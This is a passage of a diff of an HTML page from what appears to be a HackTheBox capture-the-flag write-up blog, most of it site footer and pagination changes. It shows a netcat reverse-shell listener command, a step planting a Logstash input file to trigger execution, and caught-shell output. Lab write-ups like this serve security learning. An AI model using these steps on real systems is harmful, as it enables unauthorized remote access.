 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -vv -p <span style="color:#ae81ff">4485</span>
 Listening on any address <span style="color:#ae81ff">4485</span> <span style="color:#f92672">(</span>assyst-dr<span style="color:#f92672">)</span>
 </code></pre></div><p>Then create the file Logstash will take as input (<code>/opt/kibana/logstash_*</code>) with the correct content matching the <code>filter.conf</code>.</p>
@@ -475,62 +489,71 @@ bash: no hay control de trabajos en este shell
 <p>See you next time !</p>
 <p>-hg8</p>
 
-      </div></div>
-  
-  <div class="pagination">
-    <div class="pagination__title">
-      <span
-        class="pagination__title-h">Read other posts</span>
-      <hr />
     </div>
-    <div class="pagination__buttons">
+    
       
-      <span class="button previous">
-        <a href="/posts/networked/">
-          <span class="button__icon">←</span>
-          <span class="button__text">Networked - HackTheBox</span>
-        </a>
-      </span>
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/posts/jarvis/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Jarvis - HackTheBox</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/posts/writeup/">
+                  <span class="button__text">Writeup - HackTheBox</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
       
+    
+
+
+    
       
-      <span class="button next">
-        <a href="/posts/writeup/">
-          <span class="button__text">Writeup - HackTheBox</span>
-          <span class="button__icon">→</span>
-        </a>
-      </span>
+        
+
       
+    
+
     </div>
-  </div>
-  
 
-  
+      </div>
 
-</div>
-
-  </div>
-
-  
-    <footer class="footer">
+      
+        <footer class="footer">
   <div class="footer__inner">
     
-      <div class="copyright">
-        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
-    
-        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      <div class="footer__content">
+        <span>© 2020</span>
+        <span><a href="https://hg8.rocks" target="_blank" rel="noopener">hg8</a></span>
+        <span><a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 20" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+            </a></span>
       </div>
+    
   </div>
 </footer>
+
+
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
 
+      
+    </div>
 
-
-
-
-  
-</div>
-
-</body>
+    
+  </body>
 </html>
